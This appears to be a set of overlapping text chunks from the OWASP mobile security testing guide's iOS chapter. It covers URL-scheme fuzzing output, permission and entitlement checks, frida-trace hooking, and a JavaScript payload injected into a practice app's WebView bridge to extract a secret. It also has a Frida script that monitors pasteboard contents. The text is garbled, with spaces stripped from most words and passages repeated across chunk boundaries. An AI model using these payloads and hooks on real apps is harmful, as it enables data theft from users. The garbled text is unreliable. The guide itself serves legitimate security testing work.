AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ... OK! OpenedURL:iGoat://?contactNumber=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ... &message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ... OK! OpenedURL:iGoat://?contactNumber='&message=' OK! OpenedURL:iGoat://?contactNumber=%20d&message=%20d OK! OpenedURL:iGoat://?contactNumber=%20n&message=%20n OK! OpenedURL:iGoat://?contactNumber=%20x&message=%20x OK! OpenedURL:iGoat://?contactNumber=%20s&message=%20s OK! Thescriptwilldetectifacrashoccurred. Onthisrunitdidnotdetectanycrashedbutforotherappsthiscouldbethe case. Wewouldbeabletoinspectthecrashreportsin/private/var/mobile/Library/Logs/CrashReporterorin/tmp ifitwasmovedbythescript. Checking for Sensitive Data Disclosed Through the User Interface Platform: ios MASVSV1: MSTG-STORAGE-7 MASVSV2: MASVS-PLATFORM-3 Overview Static Analysis Atextfieldthatmasksitsinputcanbeconfiguredintwoways: 468\\nStoryboardIntheiOSproject’sstoryboard,navigatetotheconfigurationoptionsforthetextfieldthattakessensitive data. Makesurethattheoption“SecureTextEntry”isselected. Ifthisoptionisactivated,dotsareshowninthetextfield inplaceofthetextinput. SourceCodeIfthetextfieldisdefinedinthesourcecode,makesurethattheoptionisSecureTextEntryissetto“true”. Thisoptionobscuresthetextinputbyshowingdots. sensitiveTextField.isSecureTextEntry =true Dynamic Analysis Todeterminewhethertheapplicationleaksanysensitiveinformationtotheuserinterface,runtheapplicationandidentify componentsthateithershowsuchinformationortakeitasinput. Iftheinformationismaskedby,forexample,asterisksordots,theappisn’tleakingdatatotheuserinterface. Testing App Permissions Platform: ios MASVSV1: MSTG-PLATFORM-1 MASVSV2: MASVS-PLATFORM-1 Overview Static Analysis SinceiOS10,thesearethemainareaswhichyouneedtoinspectforpermissions: • PurposeStringsintheInfo.plistFile • CodeSigningEntitlementsFile • EmbeddedProvisioningProfileFile • EntitlementsEmbeddedintheCompiledAppBinary • SourceCodeInspection Review application source code Ifhavingtheoriginalsourcecode,youcanverifythepermissionsincludedintheInfo.plistfile: • OpentheprojectwithXcode. • FindandopentheInfo.plistfileinthedefaulteditorandsearchforthekeysstartingwith\"Privacy -\". Youmayswitchtheviewtodisplaytherawvaluesbyright-clickingandselecting“ShowRawKeys/Values”(thiswayfor example \"Privacy - Location When In Use Usage Description\" will turn into NSLocationWhenInUseUsageDescrip- tion). 469\\nReview Info.plist IfonlyhavingtheIPA: • UnziptheIPA. • TheInfo.plistislocatedinPayload/<appname>.app/Info.plist. • Convert it if needed (e.g. plutil -convert xml1 Info.plist) as explained in the chapter “iOS Basic Security Testing”,section“TheInfo.plistFile”. • InspectallpurposestringsInfo.plistkeys,usuallyendingwithUsageDescription: <plist version=\"1.0\"> <dict> <key>NSLocationWhenInUseUsageDescription</key> <string>Yourlocation isusedtoprovideturn-by-turndirectionstoyourdestination.</string> ForeachpurposestringintheInfo.plistfile,checkifthepermissionmakessense. Forexample,imaginethefollowinglineswereextractedfromaInfo.plistfileusedbyaSolitairegame: <key>NSHealthClinicalHealthRecordsShareUsageDescription</key> <string>Shareyourhealthdatawithus!</string> <key>NSCameraUsageDescription</key> <string>Wewanttoaccessyourcamera</string> Itshouldbesuspiciousthataregularsolitairegamerequeststhiskindofresourceaccessasitprobablydoesnothave anyneedforaccessingthecameranorauser’shealth-records. Apartfromsimplycheckingif thepermissionsmakesense, furtheranalysissteps mightbederivedfromanalyzingpur- posestringse.g.iftheyarerelatedtostoragesensitivedata. Forexample,NSPhotoLibraryUsageDescriptioncanbe consideredasastoragepermissiongivingaccesstofilesthatareoutsideoftheapp’ssandboxandmightalsobeacces- sible by other apps. In this case, it should be tested that no sensitive data is being stored there (photos in this case). ForotherpurposestringslikeNSLocationAlwaysUsageDescription,itmustbealsoconsiderediftheappisstoringthis datasecurely. Refertothe“TestingDataStorage”chapterformoreinformationandbestpracticesonsecurelystoring sensitivedata. Review Embedded Provisioning Profile File Whenyoudonothavetheoriginalsourcecode,youshouldanalyzetheIPAandsearchinsidefortheembeddedprovision- ingprofilethatisusually locatedin therootappbundle folder(Payload/<appname>.app/)underthe name embedded. mobileprovision. Thisfileisnot a.plist, it isencodedusingCryptographicMessageSyntax. On macOSyoucaninspectanembedded provisioningprofile’sentitlementsusingthefollowingcommand: securitycms -D-iembedded.mobileprovision andthensearchfortheEntitlementskeyregion(<key>Entitlements</key>). Review Entitlements Embedded in the Compiled App Binary If you only have the app’s IPA or simply the installed app on a jailbroken device, you normally won’t be able to find .entitlements files. This could be",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 155
    }
  },
  {
    "text": "folder(Payload/<appname>.app/)underthe name embedded. mobileprovision. Thisfileisnot a.plist, it isencodedusingCryptographicMessageSyntax. On macOSyoucaninspectanembedded provisioningprofile’sentitlementsusingthefollowingcommand: securitycms -D-iembedded.mobileprovision andthensearchfortheEntitlementskeyregion(<key>Entitlements</key>). Review Entitlements Embedded in the Compiled App Binary If you only have the app’s IPA or simply the installed app on a jailbroken device, you normally won’t be able to find .entitlements files. This could be also the case for the embedded.mobileprovision file. Still, you should be able to extracttheentitlementspropertylistsfromtheappbinaryyourself(whichyou’vepreviouslyobtainedasexplainedinthe “iOSBasicSecurityTesting”chapter,section“AcquiringtheAppBinary”). Thefollowingstepsshouldworkevenwhentargetinganencryptedbinary. Ifforsomereasontheydon’t,you’llhaveto decryptandextracttheappwithe.g.Clutch(ifcompatiblewithyouriOSversion),frida-ios-dumporsimilar. Extracting the Entitlements Plist from the App Binary Ifyouhavetheappbinaryonyourcomputer,oneapproachistousebinwalktoextract(-e)allXMLfiles(-y=xml): 470\\n$binwalk -e-y=xml./Telegram\\X DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 1430180 0x15D2A4 XMLdocument,version: \"1.0\" 1458814 0x16427E XMLdocument,version: \"1.0\" Oryoucanuseradare2(-qctoquietlyrunonecommandandexit)tosearchallstringsontheappbinary(izz)containing “PropertyList”(~PropertyList): $r2 -qc'izz~PropertyList' ./Telegram\\X 0x0015d2a4ascii <?xmlversion=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\\n<!DOCTYPEplistPUBLIC \"-//Apple//DTDPLIST1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\\n<plistversion=\"1.0\"> ...<key>com.apple.security.application-groups</key>\\n\\t\\t<array> \\n\\t\\t\\t<string>group.ph.telegra.Telegraph</string>... 0x0016427dasciiH<?xmlversion=\"1.0\" encoding=\"UTF-8\"?>\\n<!DOCTYPEplistPUBLIC \"-//Apple//DTDPLIST1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\\n<plistversion=\"1.0\">\\n <dict>\\n\\t<key>cdhashes</key>... In both cases (binwalk or radare2) we were able to extract the same two plist files. If we inspect the first one (0x0015d2a4)weseethatwewereabletocompletelyrecovertheoriginalentitlementsfilefromTelegram. Note: thestringscommandwillnothelphereasitwillnotbeabletofindthisinformation. Betterusegrepwith the-aflagdirectlyonthebinaryoruseradare2(izz)/rabin2(-zz). Ifyouaccesstheappbinaryonthejailbrokendevice(e.gviaSSH),youcanusegrepwiththe-a, --textflag(treatsall filesasASCIItext): $grep -a-A5'PropertyList' /var/containers/Bundle/Application/ 15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35/TelegramX.app/Telegram\\X <!DOCTYPEplistPUBLIC \"-//Apple//DTDPLIST1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\"> <dict> <key>com.apple.security.application-groups</key> <array> ... Play with the -A num, --after-context=num flag to display more or less lines. You may use tools like the ones we presentedaboveaswell,ifyouhavethemalsoinstalledonyourjailbrokeniOSdevice. Thismethodshouldworkeveniftheappbinaryisstillencrypted(itwastestedagainstseveralAppStoreapps). Source Code Inspection After having checked the <appname>.entitlements file and the Info.plist file, it is time to verify how the requested permissionsandassignedcapabilitiesareputtouse. Forthis,asourcecodereviewshouldbeenough. However,ifyou don’thavetheoriginalsourcecode,verifyingtheuseofpermissionsmightbespeciallychallengingasyoumightneedto reverseengineertheapp,refertothe“DynamicAnalysis”formoredetailsonhowtoproceed. Whendoingasourcecodereview,payattentionto: • whetherthepurposestringsintheInfo.plistfilematchtheprogrammaticimplementations. • whethertheregisteredcapabilitiesareusedinsuchawaythatnoconfidentialinformationisleaking. Userscangrantorrevokeauthorizationatanytimevia“Settings”,thereforeappsnormallychecktheauthorizationstatus ofafeaturebeforeaccessingit. ThiscanbedonebyusingdedicatedAPIsavailableformanysystemframeworksthat provideaccesstoprotectedresources. YoucanusetheAppleDeveloperDocumentationasastartingpoint. Forexample: • Bluetooth: the state property of the CBCentralManager class is used to check system-authorization status for usingBluetoothperipherals. • Location: searchformethodsofCLLocationManager,e.g.locationServicesEnabled. 471\\nfunccheckForLocationServices() { ifCLLocationManager.locationServicesEnabled() { //Location servicesareavailable,soquerytheuser’slocation. }else { //Update yourapp’sUItoshowthatthelocationisunavailable. } } SeeTable1in“DeterminingtheAvailabilityofLocationServices”(AppleDeveloperDocumentation)foracomplete list. GothroughtheapplicationsearchingforusagesoftheseAPIsandcheckwhathappenstosensitivedatathatmightbe obtained from them. For example, it might be stored or transmitted over the network, if this is the case, proper data protectionandtransportsecurityshouldbeadditionallyverified. Dynamic Analysis With help of the static analysis you should already have a list of the included permissions and app capabilities in use. However, as mentioned in “Source Code Inspection”, spotting the sensitive data and APIs related to those permissions and app capabilities might be a challenging task when you don’t have the original source code. Dynamic analysis can helpheregettinginputstoiterateontothestaticanalysis. FollowinganapproachliketheonepresentedbelowshouldhelpyouspottingthementionedsensitivedataandAPIs: 1. Consider the list of permissions / capabilities identified in the static analysis (e.g. NSLocationWhenI- nUseUsageDescription). 2. MapthemtothededicatedAPIsavailableforthecorrespondingsystemframeworks(e.g.CoreLocation). Youmay usetheAppleDeveloperDocumentationforthis. 3. TraceclassesorspecificmethodsofthoseAPIs(e.g.CLLocationManager),forexample,usingfrida-trace. 4. Identify which methods are being really used by the app while accessing the related feature (e.g. “Share your location”). 5. Getabacktraceforthosemethodsandtrytobuildacallgraph. Onceallmethodswereidentified,youmightusethisknowledgetoreverseengineertheappandtrytofindouthowthe dataisbeinghandled. Whiledoingthatyoumightspotnewmethodsinvolvedintheprocesswhichyoucanagainfeed tostep3. aboveandkeepiteratingbetweenstaticanddynamicanalysis. InthefollowingexampleweuseTelegramtoopenthesharedialogfromachatandfrida-tracetoidentifywhichmethods arebeingcalled. First we launch Telegram and start a trace for all methods matching the string “authorizationStatus” (this is a general approachbecausemoreclassesapartfromCLLocationManagerimplementthismethod): frida-trace -U\"Telegram\" -m\"*[**authorizationStatus*]\" -U connects to the USB device. -m includes an Objective-C method to the traces. You can use a glob pattern (e.g. with the “*” wildcard, -m \"*[* *authorizationStatus*]\" means “include any Objective-C method of any classcontaining‘authorizationStatus’”). Typefrida-trace -hformoreinformation. Nowweopenthesharedialog: 472\\nThefollowingmethodsaredisplayed: 1942ms +[PHPhotoLibraryauthorizationStatus] 1959ms +[TGMediaAssetsLibraryauthorizationStatusSignal] 1959ms |+[TGMediaAssetsModernLibraryauthorizationStatusSignal] IfweclickonLocation,anothermethodwillbetraced: 11186ms +[CLLocationManagerauthorizationStatus] 11186ms |+[CLLocationManager_authorizationStatus] 11186ms | |+[CLLocationManager_authorizationStatusForBundleIdentifier:0x0bundle:0x0] Use the auto-generated stubs of frida-trace to get more information like the return values and a backtrace. Do the followingmodificationstotheJavaScriptfilebelow(thepathisrelativetothecurrentdirectory): 473\\n//__handlers__/__CLLocationManager_authorizationStatus_.js onEnter:function (log,args,state){ log(\"+[CLLocationManagerauthorizationStatus]\"); log(\"Calledfrom:\\n\"+ Thread.backtrace(this.context,Backtracer.ACCURATE) .map(DebugSymbol.fromAddress).join(\"\\n\\t\")+\"\\n\"); }, onLeave:function (log,retval,state){ console.log('RET:' +retval.toString()); } Clickingagainon“Location”revealsmoreinformation: 3630ms -[CLLocationManager init] 3630ms |-[CLLocationManagerinitWithEffectiveBundleIdentifier:0x0bundle:0x0] 3634ms -[CLLocationManager setDelegate:0x14c9ab000]",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 156
    }
  },
  {
    "text": "IfweclickonLocation,anothermethodwillbetraced: 11186ms +[CLLocationManagerauthorizationStatus] 11186ms |+[CLLocationManager_authorizationStatus] 11186ms | |+[CLLocationManager_authorizationStatusForBundleIdentifier:0x0bundle:0x0] Use the auto-generated stubs of frida-trace to get more information like the return values and a backtrace. Do the followingmodificationstotheJavaScriptfilebelow(thepathisrelativetothecurrentdirectory): 473\\n//__handlers__/__CLLocationManager_authorizationStatus_.js onEnter:function (log,args,state){ log(\"+[CLLocationManagerauthorizationStatus]\"); log(\"Calledfrom:\\n\"+ Thread.backtrace(this.context,Backtracer.ACCURATE) .map(DebugSymbol.fromAddress).join(\"\\n\\t\")+\"\\n\"); }, onLeave:function (log,retval,state){ console.log('RET:' +retval.toString()); } Clickingagainon“Location”revealsmoreinformation: 3630ms -[CLLocationManager init] 3630ms |-[CLLocationManagerinitWithEffectiveBundleIdentifier:0x0bundle:0x0] 3634ms -[CLLocationManager setDelegate:0x14c9ab000] 3641ms +[CLLocationManagerauthorizationStatus] RET:0x4 3641ms Calledfrom: 0x1031aa158TelegramUI!+[TGLocationUtilsrequestWhenInUserLocationAuthorizationWithLocationManager:] 0x10337e2c0TelegramUI!-[TGLocationPickerControllerinitWithContext:intent:] 0x101ee93acTelegramUI!0x1013ac Weseethat+[CLLocationManager authorizationStatus]returned0x4(CLAuthorizationStatus.authorizedWhenInUse) and was called by +[TGLocationUtils requestWhenInUserLocationAuthorizationWithLocationManager:]. As we anticipatedbefore,youmightusethiskindofinformationasanentrypointwhenreverseengineeringtheappandfrom theregetinputs(e.g.namesofclassesormethods)tokeepfeedingthedynamicanalysis. Next,thereisavisualwaytoinspectthestatusofsomeapppermissionswhenusingtheiPhone/iPadbyopening“Settings” andscrollingdownuntilyoufindtheappyou’reinterestedin. Whenclickingonit,thiswillopenthe“ALLOWAPP_NAME TOACCESS”screen. However, notallpermissionsmightbedisplayedyet. Youwillhavetotriggertheminordertobe listedonthatscreen. Forexample,inthepreviousexample,the“Location”entrywasnotbeinglisteduntilwetriggeredthepermissiondialogue forthefirsttime. Oncewedidit,nomatterifweallowedtheaccessornot,thethe“Location”entrywillbedisplayed. Determining Whether Native Methods Are Exposed Through WebViews 474\\nPlatform: ios MASVSV1: MSTG-PLATFORM-7 MASVSV2: MASVS-PLATFORM-2 Overview Static Analysis Testing UIWebView JavaScript to Native Bridges SearchforcodethatmapsnativeobjectstotheJSContextassociatedwithaWebViewandanalyzewhatfunctionalityit exposes,forexamplenosensitivedatashouldbeaccessibleandexposedtoWebViews. InObjective-C,theJSContextassociatedwithaUIWebViewisobtainedasfollows: [webViewvalueForKeyPath:@\"documentView.webView.mainFrame.javaScriptContext\"] Testing WKWebView JavaScript to Native Bridges VerifyifaJavaScripttonativebridgeexistsbysearchingforWKScriptMessageHandlerandcheckallexposedmethods. Thenverifyhowthemethodsarecalled. Thefollowingexamplefrom“Where’sMyBrowser?” demonstratesthis. FirstweseehowtheJavaScriptbridgeisenabled: func enableJavaScriptBridge(_enabled:Bool){ options_dict[\"javaScriptBridge\"]?.value =enabled letuserContentController =wkWebViewConfiguration.userContentController userContentController.removeScriptMessageHandler(forName:\"javaScriptBridge\") ifenabled { letjavaScriptBridgeMessageHandler =JavaScriptBridgeMessageHandler() userContentController.add(javaScriptBridgeMessageHandler,name:\"javaScriptBridge\") } } Addingascriptmessagehandlerwithname\"name\"(or\"javaScriptBridge\"intheexampleabove)causestheJavaScript functionwindow.webkit.messageHandlers.myJavaScriptMessageHandler.postMessagetobedefinedinallframesin allwebviewsthatusetheusercontentcontroller. ItcanbethenusedfromtheHTMLfilelikethis: function invokeNativeOperation(){ value1 =document.getElementById(\"value1\").value value2 =document.getElementById(\"value2\").value window.webkit.messageHandlers.javaScriptBridge.postMessage([\"multiplyNumbers\",value1,value2]); } ThecalledfunctionresidesinJavaScriptBridgeMessageHandler.swift: class JavaScriptBridgeMessageHandler:NSObject,WKScriptMessageHandler { //... case \"multiplyNumbers\": letarg1 =Double(messageArray[1])! letarg2 =Double(messageArray[2])! result =String(arg1 *arg2) //... letjavaScriptCallBack =\"javascriptBridgeCallBack('\\(functionFromJS)','\\(result)')\" message.webView?.evaluateJavaScript(javaScriptCallBack,completionHandler:nil) TheproblemhereisthattheJavaScriptBridgeMessageHandlernotonlycontainsthatfunction,italsoexposesasensitive function: 475\\ncase \"getSecret\": result =\"XSRSOGKC342\" Dynamic Analysis At this point you’ve surely identified all potentially interesting WebViews in the iOS app and got an overview of the potentialattacksurface(viastaticanalysis,thedynamicanalysistechniquesthatwehaveseeninprevioussectionsora combinationofthem). ThiswouldincludeHTMLandJavaScriptfiles,usageoftheJSContext/JSExportforUIWebView andWKScriptMessageHandlerforWKWebView,aswellaswhichfunctionsareexposedandpresentinaWebView. Further dynamic analysis can help you exploit those functions and get sensitive data that they might be exposing. As wehaveseeninthestaticanalysis,inthepreviousexampleitwastrivialtogetthesecretvaluebyperformingreverse engineering (the secret value was found in plain text inside the source code) but imagine that the exposed function retrievesthesecretfromsecurestorage. Inthiscase,onlydynamicanalysisandexploitationwouldhelp. TheprocedureforexploitingthefunctionsstartswithproducingaJavaScriptpayloadandinjectingitintothefilethatthe appisrequesting. Theinjectioncanbeaccomplishedviavarioustechniques,forexample: • IfsomeofthecontentisloadedinsecurelyfromtheInternetoverHTTP(mixedcontent),youcantrytoimplement aMITMattack. • YoucanalwaysperformdynamicinstrumentationandinjecttheJavaScriptpayloadbyusingframeworkslikeFrida and the corresponding JavaScript evaluation functions available for the iOS WebViews (stringByEvaluating- JavaScriptFromString: forUIWebViewandevaluateJavaScript:completionHandler: forWKWebView). In order to get the secret from the previous example of the “Where’s My Browser?” app, you can use one of these techniquestoinjectthefollowingpayloadthatwillrevealthesecretbywritingittothe“result”fieldoftheWebView: function javascriptBridgeCallBack(name,value){ document.getElementById(\"result\").innerHTML=value; }; window.webkit.messageHandlers.javaScriptBridge.postMessage([\"getSecret\"]); Ofcourse,youmayalsousetheExploitationHelperitprovides: 476\\nSeeanotherexampleforavulnerableiOSappandfunctionthatisexposedtoaWebViewin[#thiel2]page156. Determining Whether Sensitive Data Is Exposed via IPC Mechanisms Platform: ios MASVSV1: MSTG-STORAGE-6 MASVSV2: MASVS-PLATFORM-1 477\\nOverview Static Analysis The following section summarizes keywords that you should look for to identify IPC implementations within iOS source code. XPC Services SeveralclassesmaybeusedtoimplementtheNSXPCConnectionAPI: • NSXPCConnection • NSXPCInterface • NSXPCListener • NSXPCListenerEndpoint Youcansetsecurityattributesfortheconnection. Theattributesshouldbeverified. CheckforthefollowingtwofilesintheXcodeprojectfortheXPCServicesAPI(whichisC-based): • xpc.h • connection.h Mach Ports Keywordstolookforinlow-levelimplementations: • mach_port_t • mach_msg_* Keywordstolookforinhigh-levelimplementations(CoreFoundationandFoundationwrappers): • CFMachPort • CFMessagePort • NSMachPort • NSMessagePort NSFileCoordinator Keywordstolookfor: • NSFileCoordinator Dynamic Analysis VerifyIPCmechanismswithstaticanalysisoftheiOSsourcecode. NoiOStooliscurrentlyavailabletoverifyIPCusage. Testing UIPasteboard Platform: ios MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 478\\nOverview Static Analysis The systemwide general pasteboard can be obtained by using generalPasteboard, search the source code or the compiledbinaryforthismethod. Usingthesystemwidegeneralpasteboardshouldbeavoidedwhendealingwithsensitive data. Custom pasteboards can be created with pasteboardWithName:create: or pasteboardWithUniqueName. Verify if custom pasteboards are set to be persistent as this is deprecated since iOS 10. A shared container should be used instead. Inaddition,thefollowingcanbeinspected: • CheckifpasteboardsarebeingremovedwithremovePasteboardWithName:,whichinvalidatesanapppasteboard, freeingupallresourcesusedbyit(noeffectforthegeneralpasteboard). • Checkifthereareexcludedpasteboards,thereshouldbeacalltosetItems:options: withtheUIPasteboardOp- tionLocalOnlyoption. • Checkifthereareexpiringpasteboards,thereshouldbeacalltosetItems:options: withtheUIPasteboardOp- tionExpirationDateoption. • Checkiftheappswipesthepasteboarditemswhengoingtobackgroundorwhenterminating. Thisisdonebysome passwordmanagerappstryingtorestrictsensitivedataexposure. Dynamic Analysis Detect Pasteboard Usage Hookortracethefollowing: • generalPasteboardforthesystem-widegeneralpasteboard. • pasteboardWithName:create: andpasteboardWithUniqueNameforcustompasteboards. Detect Persistent Pasteboard Usage HookortracethedeprecatedsetPersistent: methodandverifyifit’sbeingcalled. Monitoring and Inspecting Pasteboard Items Whenmonitoringthepasteboards,thereisseveraldetailsthatmaybedynamicallyretrieved: • ObtainpasteboardnamebyhookingpasteboardWithName:create: andinspectingitsinputparametersorpaste- boardWithUniqueNameandinspectingitsreturnvalue. • Getthefirstavailablepasteboarditem: e.g.forstringsusestringmethod. Oruseanyoftheothermethodsfor thestandarddatatypes. • GetthenumberofitemswithnumberOfItems. • Checkforexistenceofstandarddatatypeswiththeconveniencemethods,e.g.hasImages,hasStrings,hasURLs (startinginiOS10). • Check for other data types (typically UTIs) with containsPasteboardTypes: inItemSet:. You may inspect for moreconcretedatatypeslike,forexampleanpictureaspublic.pngandpublic.tiff(UTIs)orforcustomdatasuch ascom.mycompany.myapp.mytype. Rememberthat,inthiscase,onlythoseappsthatdeclareknowledgeofthe",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 157
    }
  },
  {
    "text": "Hookortracethefollowing: • generalPasteboardforthesystem-widegeneralpasteboard. • pasteboardWithName:create: andpasteboardWithUniqueNameforcustompasteboards. Detect Persistent Pasteboard Usage HookortracethedeprecatedsetPersistent: methodandverifyifit’sbeingcalled. Monitoring and Inspecting Pasteboard Items Whenmonitoringthepasteboards,thereisseveraldetailsthatmaybedynamicallyretrieved: • ObtainpasteboardnamebyhookingpasteboardWithName:create: andinspectingitsinputparametersorpaste- boardWithUniqueNameandinspectingitsreturnvalue. • Getthefirstavailablepasteboarditem: e.g.forstringsusestringmethod. Oruseanyoftheothermethodsfor thestandarddatatypes. • GetthenumberofitemswithnumberOfItems. • Checkforexistenceofstandarddatatypeswiththeconveniencemethods,e.g.hasImages,hasStrings,hasURLs (startinginiOS10). • Check for other data types (typically UTIs) with containsPasteboardTypes: inItemSet:. You may inspect for moreconcretedatatypeslike,forexampleanpictureaspublic.pngandpublic.tiff(UTIs)orforcustomdatasuch ascom.mycompany.myapp.mytype. Rememberthat,inthiscase,onlythoseappsthatdeclareknowledgeofthe typeareabletounderstandthedatawrittentothepasteboard. Thisisthesameaswehaveseeninthe“UIActivity Sharing”section. RetrievethemusingitemSetWithPasteboardTypes: andsettingthecorrespondingUTIs. • CheckforexcludedorexpiringitemsbyhookingsetItems:options: andinspectingitsoptionsforUIPasteboar- dOptionLocalOnlyorUIPasteboardOptionExpirationDate. Ifonlylookingforstringsyoumaywanttouseobjection’scommandios pasteboard monitor: Hooks into the iOS UIPasteboard class and polls the generalPasteboard every 5 seconds for data. If new data is found,differentfromthepreviouspoll,thatdatawillbedumpedtoscreen. 479\\nYoumayalsobuildyourownpasteboardmonitorthatmonitorsspecificinformationasseenabove. Forexample,thisscript(inspiredfromthescriptbehindobjection’spasteboardmonitor)readsthepasteboarditemsevery 5seconds,ifthere’ssomethingnewitwillprintit: const UIPasteboard =ObjC.classes.UIPasteboard; const Pasteboard =UIPasteboard.generalPasteboard(); varitems =\"\"; varcount =Pasteboard.changeCount().toString(); setInterval(function (){ const currentCount =Pasteboard.changeCount().toString(); const currentItems =Pasteboard.items().toString(); if(currentCount ===count){ return;} items =currentItems; count =currentCount; console.log('[*Pasteboardchanged]count:' +count + 'hasStrings:' +Pasteboard.hasStrings().toString()+ 'hasURLs:' +Pasteboard.hasURLs().toString()+ 'hasImages:' +Pasteboard.hasImages().toString()); console.log(items); },1000 *5); Intheoutputwecanseethefollowing: [*Pasteboardchanged]count:64hasStrings:truehasURLs:falsehasImages:false ( { \"public.utf8-plain-text\" =hola; } ) [*Pasteboardchanged]count:65hasStrings:truehasURLs:truehasImages:false ( { \"public.url\" =\"https://codeshare.frida.re/\"; \"public.utf8-plain-text\" =\"https://codeshare.frida.re/\"; } ) [*Pasteboardchanged]count:66hasStrings:falsehasURLs:falsehasImages:true ( { \"com.apple.uikit.image\" =\"<UIImage:0x1c42b23c0>size{571,264}orientation0scale1.000000\"; \"public.jpeg\" =\"<UIImage:0x1c44a1260>size{571,264}orientation0scale1.000000\"; \"public.png\" =\"<UIImage:0x1c04aaaa0>size{571,264}orientation0scale1.000000\"; } ) Youseethatfirstatextwascopiedincludingthestring“hola”,afterthataURLwascopiedandfinallyapicturewascopied. SomeofthemareavailableviadifferentUTIs. OtherappswillconsidertheseUTIstoallowpastingofthisdataornot. Testing for Sensitive Functionality Exposure Through IPC Platform: ios MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 Testing Auto-Generated Screenshots for Sensitive Information Platform: ios MASVSV1: MSTG-STORAGE-9 MASVSV2: MASVS-PLATFORM-3 480\\nOverview Static Analysis Ifyouhavethesourcecode,searchfortheapplicationDidEnterBackgroundmethodtodeterminewhethertheapplica- tionsanitizesthescreenbeforebeingbackgrounded. Thefollowingisasampleimplementationusingadefaultbackgroundimage(overlayImage.png)whenevertheapplica- tionisbackgrounded,overridingthecurrentview: Swift: private varbackgroundImage:UIImageView? func applicationDidEnterBackground(_application:UIApplication){ letmyBanner =UIImageView(image:#imageLiteral(resourceName:\"overlayImage\")) myBanner.frame =UIScreen.main.bounds backgroundImage =myBanner window?.addSubview(myBanner) } func applicationWillEnterForeground(_application:UIApplication){ backgroundImage?.removeFromSuperview() } Objective-C: @property (UIImageView *)backgroundImage; -(void)applicationDidEnterBackground:(UIApplication *)application { UIImageView *myBanner =[[UIImageViewalloc]initWithImage:@\"overlayImage.png\"]; self.backgroundImage =myBanner; self.backgroundImage.bounds =UIScreen.mainScreen.bounds; [self.windowaddSubview:myBanner]; } -(void)applicationWillEnterForeground:(UIApplication *)application { [self.backgroundImageremoveFromSuperview]; } ThissetsthebackgroundimagetooverlayImage.pngwhenevertheapplicationisbackgrounded. Itpreventssensitive dataleaksbecauseoverlayImage.pngwillalwaysoverridethecurrentview. Dynamic Analysis YoucanuseavisualapproachtoquicklyvalidatethistestcaseusinganyiOSdevice(jailbrokenornot): 1. Navigate to an application screen that displays sensitive information, such as a username, an email address, or accountdetails. 2. BackgroundtheapplicationbyhittingtheHomebuttononyouriOSdevice. 3. Verifythatadefaultimageisshownasthetopviewelementinsteadoftheviewcontainingthesensitiveinformation. If required, you may also collect evidence by performing steps 1 to 3 on a jailbroken device or a non-jailbroken device afterrepackagingtheappwiththeFridaGadget. Afterthat, connecttotheiOSdeviceperSSHorbyothermeansand navigatetotheSnapshotsdirectory. ThelocationmaydifferoneachiOSversionbutit’susuallyinsidetheapp’sLibrary directory. Forinstance,oniOS14.5theSnapshotsdirectoryislocatedat: /var/mobile/Containers/Data/Application/$APP_ID/Library/SplashBoard/Snapshots/sceneID:$APP_NAME-default/ Thescreenshotsinsidethatfoldershouldnotcontainanysensitiveinformation. Testing UIActivity Sharing 481\\nPlatform: ios MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 Overview Static Analysis Sending Items WhentestingUIActivitySharingyoushouldpayspecialattentionto: • thedata(items)beingshared, • thecustomactivities, • theexcludedactivitytypes. Data sharing via UIActivity works by creating a UIActivityViewController and passing it the desired items (URLs, text,apicture)oninit(activityItems: applicationActivities:). 